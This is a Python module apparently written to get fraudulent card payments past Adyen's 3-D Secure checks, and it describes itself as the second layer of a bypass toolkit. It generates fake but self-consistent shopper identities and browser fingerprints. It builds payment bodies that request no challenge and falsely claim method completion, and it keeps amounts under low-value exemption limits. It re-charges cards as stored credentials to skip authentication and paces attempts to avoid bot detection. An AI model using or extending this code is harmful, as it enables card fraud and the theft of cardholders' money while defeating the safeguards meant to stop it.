"""
adyen_escalate.py — Adyen Level-2 escalation vectors (the soft bypass layer).

Level 1 (adyen_bypass.py) fights the challenge after it's raised.
Level 2 makes the risk engine decide there's nothing worth challenging:

  A. TRA hygiene      — a coherent, boring, low-risk profile. The DS grants the
                       low-risk SCA exemption when shopper, browser, IP geography
                       and behaviour all agree. ONE mismatch = challenge.
  B. Low-value exempt — keep the amount under the SCA low-value threshold so the
                       DS exempts it by regulation (no challenge allowed).
  C. Full-control body — when a merchant endpoint proxies client bodies to
                       /payments, send the COMPLETE requestor-controlled 3DS
                       fields (challengeIndicator, threeDSCompInd, authenticationOnly).
  D. Stored-credential pivot — after one Authorised, re-issue the same shopper as
                       an UnscheduledCardOnFile credential; repeat charges skip SCA
                       under the stored/recurring exemption.
"""

import os
import json
import random
from typing import Dict, Optional


# ── currency exponent / minor-unit helpers ─────────────────────────────────
CURRENCY_EXP = {
    'USD': 2, 'EUR': 2, 'GBP': 2, 'AUD': 2, 'CAD': 2, 'CHF': 2,
    'DKK': 2, 'NOK': 2, 'SEK': 2, 'PLN': 2, 'SGD': 2, 'HKD': 2,
    'KWD': 3, 'BHD': 3, 'IQD': 3, 'JOD': 3, 'TND': 3, 'LYD': 3,
    'JPY': 0, 'VND': 0, 'KRW': 0, 'CLP': 0, 'IDR': 0, 'ISK': 0,
}

# SCA low-value exemption thresholds, in MINOR UNITS (per-currency).
SCA_LOW_VALUE = {
    'EUR': 3000,  # €30
    'GBP': 3000,  # £30
    'USD': 3000,  # ~$30 (no SCA in US, but keeps TRA quiet)
    'DKK': 22500, 'SEK': 30000, 'NOK': 30000,  # ~€30 equiv
}


def minor_to_major(value: int, currency: str) -> float:
    return value / (10 ** CURRENCY_EXP.get(currency, 2))


def sca_low_value_exempt(amount_value: int, currency: str) -> bool:
    """True if the amount sits under the SCA low-value exemption."""
    thr = SCA_LOW_VALUE.get(currency.upper())
    if thr is None:
        return False
    return int(amount_value) <= thr


# ── coherent geo/shopper profiles ──────────────────────────────────────────
GEO = {
    # country: (tz range, language, phone prefix, firsts, lasts, cities(zip,state))
    'US': dict(
        tz=(-300, -480), lang='en-US', phone='+1',
        first=['James', 'Michael', 'Robert', 'William', 'David', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia'],
        last=['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'],
        cities=[('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'),
                ('Miami', 'FL', '33101'), ('Seattle', 'WA', '98101'), ('Austin', 'TX', '73301')],
        streets=['Oak Street', 'Maple Ave', 'Washington Blvd', 'Cedar Lane', 'Pine Street', 'Broadway']),
    'GB': dict(
        tz=(0, 0), lang='en-GB', phone='+44',
        first=['Oliver', 'George', 'Harry', 'Jack', 'Jacob', 'Amelia', 'Olivia', 'Isla', 'Emily', 'Poppy'],
        last=['Smith', 'Jones', 'Taylor', 'Brown', 'Williams', 'Wilson', 'Johnson', 'Davies'],
        cities=[('London', 'LND', 'SW1A 1AA'), ('Manchester', 'MAN', 'M1 1AE'), ('Birmingham', 'BIR', 'B1 1AA'),
                ('Leeds', 'LDS', 'LS1 1UR'), ('Glasgow', 'GLA', 'G1 1XW')],
        streets=['High Street', 'Station Road', 'Church Lane', 'Park Road', 'Victoria Street', 'Mill Lane']),
    'DE': dict(
        tz=(60, 60), lang='de-DE', phone='+49',
        first=['Lukas', 'Leon', 'Finn', 'Jonas', 'Noah', 'Mia', 'Emma', 'Hannah', 'Lena', 'Sophie'],
        last=['Müller', 'Schmidt', 'Schneider', 'Fischer', 'Weber', 'Meyer', 'Wagner', 'Becker'],
        cities=[('Berlin', 'BE', '10115'), ('München', 'BY', '80331'), ('Hamburg', 'HH', '20095'),
                ('Köln', 'NW', '50667'), ('Frankfurt', 'HE', '60311')],
        streets=['Hauptstraße', 'Bahnhofstraße', 'Schulstraße', 'Gartenweg', 'Dorfstraße', 'Ringstraße']),
    'FR': dict(
        tz=(60, 60), lang='fr-FR', phone='+33',
        first=['Lucas', 'Hugo', 'Léo', 'Gabriel', 'Raphaël', 'Emma', 'Louise', 'Jade', 'Chloé', 'Manon'],
        last=['Martin', 'Bernard', 'Thomas', 'Petit', 'Robert', 'Richard', 'Durand', 'Dubois'],
        cities=[('Paris', 'IDF', '75001'), ('Lyon', 'ARA', '69001'), ('Marseille', 'PAC', '13001'),
                ('Toulouse', 'OCC', '31000'), ('Bordeaux', 'NAQ', '33000')],
        streets=['Rue de la Paix', 'Rue du Commerce', 'Avenue de la République', 'Rue des Écoles', 'Place du Marché']),
    'ES': dict(
        tz=(60, 60), lang='es-ES', phone='+34',
        first=['Alejandro', 'Pablo', 'David', 'Adrián', 'Álvaro', 'Lucía', 'María', 'Paula', 'Sara', 'Alba'],
        last=['García', 'Rodríguez', 'González', 'Fernández', 'López', 'Martínez', 'Sánchez', 'Pérez'],
        cities=[('Madrid', 'MD', '28001'), ('Barcelona', 'CT', '08001'), ('Valencia', 'VC', '46001'),
                ('Sevilla', 'AN', '41001'), ('Bilbao', 'PV', '48001')],
        streets=['Calle Mayor', 'Calle de la Cruz', 'Avenida de la Constitución', 'Calle Real', 'Plaza Mayor']),
    'IT': dict(
        tz=(60, 60), lang='it-IT', phone='+39',
        first=['Francesco', 'Alessandro', 'Lorenzo', 'Matteo', 'Andrea', 'Sofia', 'Giulia', 'Aurora', 'Alice', 'Martina'],
        last=['Rossi', 'Russo', 'Ferrari', 'Esposito', 'Bianchi', 'Romano', 'Colombo', 'Ricci'],
        cities=[('Roma', 'RM', '00118'), ('Milano', 'MI', '20121'), ('Napoli', 'NA', '80121'),
                ('Torino', 'TO', '10121'), ('Firenze', 'FI', '50121')],
        streets=['Via Roma', 'Corso Vittorio Emanuele', 'Via Garibaldi', 'Via Dante', 'Piazza del Popolo']),
    'NL': dict(
        tz=(60, 60), lang='nl-NL', phone='+31',
        first=['Daan', 'Sem', 'Lucas', 'Milan', 'Levi', 'Emma', 'Julia', 'Sophie', 'Lotte', 'Fleur'],
        last=['de Jong', 'Jansen', 'de Vries', 'van den Berg', 'van Dijk', 'Bakker', 'Visser', 'Smit'],
        cities=[('Amsterdam', 'NH', '1011'), ('Rotterdam', 'ZH', '3011'), ('Den Haag', 'ZH', '2511'),
                ('Utrecht', 'UT', '3511'), ('Eindhoven', 'NB', '5611')],
        streets=['Hoofdstraat', 'Dorpsstraat', 'Kerkstraat', 'Molenstraat', 'Schoolstraat']),
    'SE': dict(
        tz=(60, 60), lang='sv-SE', phone='+46',
        first=['William', 'Liam', 'Noah', 'Oscar', 'Elias', 'Alice', 'Maja', 'Elsa', 'Astrid', 'Ebba'],
        last=['Andersson', 'Johansson', 'Karlsson', 'Nilsson', 'Eriksson', 'Larsson', 'Olsson', 'Persson'],
        cities=[('Stockholm', 'AB', '111 21'), ('Göteborg', 'O', '411 03'), ('Malmö', 'M', '211 34'),
                ('Uppsala', 'C', '753 20')],
        streets=['Storgatan', 'Kungsgatan', 'Drottninggatan', 'Vasagatan', 'Kyrkogatan']),
    'AU': dict(
        tz=(600, 660), lang='en-AU', phone='+61',
        first=['Jack', 'Oliver', 'Noah', 'William', 'Thomas', 'Charlotte', 'Olivia', 'Mia', 'Amelia', 'Ruby'],
        last=['Smith', 'Jones', 'Williams', 'Brown', 'Wilson', 'Taylor', 'Johnson', 'White'],
        cities=[('Sydney', 'NSW', '2000'), ('Melbourne', 'VIC', '3000'), ('Brisbane', 'QLD', '4000'),
                ('Perth', 'WA', '6000'), ('Adelaide', 'SA', '5000')],
        streets=['George Street', 'Victoria Road', 'Station Street', 'High Street', 'Elizabeth Street']),
    'CA': dict(
        tz=(-240, -480), lang='en-CA', phone='+1',
        first=['Liam', 'Noah', 'Ethan', 'Lucas', 'Mason', 'Olivia', 'Emma', 'Ava', 'Sophia', 'Isabella'],
        last=['Smith', 'Brown', 'Tremblay', 'Martin', 'Roy', 'Wilson', 'Macdonald', 'Campbell'],
        cities=[('Toronto', 'ON', 'M5V'), ('Vancouver', 'BC', 'V6B'), ('Montreal', 'QC', 'H2X'),
                ('Calgary', 'AB', 'T2P'), ('Ottawa', 'ON', 'K1P')],
        streets=['King Street', 'Queen Street', 'Main Street', 'Bay Street', 'Yonge Street']),
    'SG': dict(
        tz=(480, 480), lang='en-SG', phone='+65',
        first=['Ethan', 'Jayden', 'Marcus', 'Ryan', 'Bryan', 'Siti', 'Nurul', 'Wei Ling', 'Xin Yi', 'Priya'],
        last=['Tan', 'Lim', 'Lee', 'Ng', 'Wong', 'Chua', 'Goh', 'Ong'],
        cities=[('Singapore', 'SG', '018956'), ('Singapore', 'SG', '238859'), ('Singapore', 'SG', '189555')],
        streets=['Orchard Road', 'Bukit Timah Road', 'Serangoon Road', 'Geylang Road', 'Jalan Besar']),
}


class ShopperProfile:
    """One coherent, self-consistent persona for a given geo."""

    def __init__(self, country: str = 'US'):
        geo = GEO.get(country.upper(), GEO['US'])
        self.country = country.upper()
        self._geo = geo
        self.first = random.choice(geo['first'])
        self.last = random.choice(geo['last'])
        self.full_name = f"{self.first} {self.last}"
        self.email = f"{self.first.lower()}.{self.last.lower()}{random.randint(10, 9999)}@{random.choice(['gmail.com', 'outlook.com', 'proton.me'])}"
        self.phone = geo['phone'] + ''.join(str(random.randint(0, 9)) for _ in range(9))
        self.city, self.state, self.zip = random.choice(geo['cities'])
        self.house_number = str(random.randint(10, 9999))
        self.street = f"{self.house_number} {random.choice(geo['streets'])}"
        # timezone tied to geo — IP, browser and address must agree
        tz_a, tz_b = geo['tz']
        self.tz_offset = random.choice(range(min(tz_a, tz_b), max(tz_a, tz_b) + 1, 60))

    @property
    def language(self) -> str:
        return self._geo['lang']

    def billing_address(self) -> dict:
        return {
            "city": self.city, "country": self.country,
            "houseNumberOrName": self.house_number,
            "postalCode": self.zip, "stateOrProvince": self.state,
            "street": self.street,
        }

    def as_payment_fields(self) -> dict:
        return {
            "shopperEmail": self.email,
            "shopperName": {"firstName": self.first, "lastName": self.last},
            "telephoneNumber": self.phone,
            "billingAddress": self.billing_address(),
            "deliveryAddress": self.billing_address(),
        }


def build_browser_info(profile: Optional[ShopperProfile] = None,
                       ua: Optional[str] = None) -> dict:
    """browserInfo with timezone locked to the profile geo (TRA consistency)."""
    p = profile or ShopperProfile('US')
    return {
        "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "colorDepth": random.choice([24, 24, 24, 30]),
        "language": p.language,
        "javaEnabled": False,
        "screenHeight": random.choice([1080, 1440, 900, 1200]),
        "screenWidth": random.choice([1920, 2560, 1440, 1680]),
        "timeZoneOffset": p.tz_offset,
        "userAgent": ua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }


def full_control_body(encrypted: dict, profile: ShopperProfile,
                      amount_value: int, currency: str,
                      merchant_reference: Optional[str] = None,
                      shopper_ip: Optional[str] = None,
                      authentication_only: bool = False) -> dict:
    """
    Maximum-control direct /payments body for merchants that proxy client
    payloads. Requestor-controlled 3DS exemption fields go here.
    """
    body = {
        "amount": {"value": int(amount_value), "currency": currency.upper()},
        "reference": merchant_reference or f"txn-{random.randint(100000, 999999)}",
        "channel": "Web",
        "origin": "",
        "returnUrl": "https://checkoutshopper-live.adyen.com/checkoutshopper/threeDSResult",
        "paymentMethod": {"type": "scheme", "holderName": profile.full_name, **encrypted},
        "browserInfo": build_browser_info(profile),
        "clientStateDataIndicator": True,
        **profile.as_payment_fields(),
        # ── the whole point ──
        "threeDS2RequestData": {
            "threeDSCompInd": "Y",              # claim method completed
            "challengeIndicator": "01",         # no challenge requested
            "authenticationOnly": authentication_only,
        },
    }
    if shopper_ip:
        body["shopperIP"] = shopper_ip
    if authentication_only:
        body["threeDS2RequestData"]["authenticationOnly"] = True
    return body


# ── stored-credential pivot (the long con) ────────────────────────────────
def extract_stored_ref(response: dict) -> Optional[str]:
    """Pull the stored-credential / recurring reference from a payment response."""
    add = response.get('additionalData') or {}
    if isinstance(add, dict):
        for k in ('recurring.recurringDetailReference', 'recurringDetailReference',
                  'recurring.recurringReference', 'recurringReference'):
            if add.get(k):
                return add[k]
    if response.get('storedPaymentMethodId'):
        return response['storedPaymentMethodId']
    if response.get('recurringDetailReference'):
        return response['recurringDetailReference']
    return None


def stored_credential_body(encrypted: dict, profile: ShopperProfile,
                           amount_value: int, currency: str,
                           stored_ref: str) -> dict:
    """
    Re-issue the same shopper as UnscheduledCardOnFile — repeat charges are
    SCA-exempt under the stored-credential exemption. Requires the FIRST auth
    to have been Authorised (that's where the stored_ref comes from).
    """
    body = full_control_body(encrypted, profile, amount_value, currency)
    body["recurringProcessingModel"] = "UnscheduledCardOnFile"
    body["shopperReference"] = f"shopper_{profile.first.lower()}{profile.last.lower()}{hash(profile.full_name) % 10000}"
    body["recurringDetailReference"] = stored_ref
    body.pop("threeDS2RequestData", None)   # stored creds don't need 3DS
    return body


# ── pacing / hygiene (batch survivability) ────────────────────────────────
def attempt_delay(attempt: int, base: float = 1.4, jitter: float = 0.7) -> float:
    """Human-ish pacing between attempts so the risk engine sees no bot rhythm."""
    return base + random.random() * jitter + (0.15 * (attempt % 7))
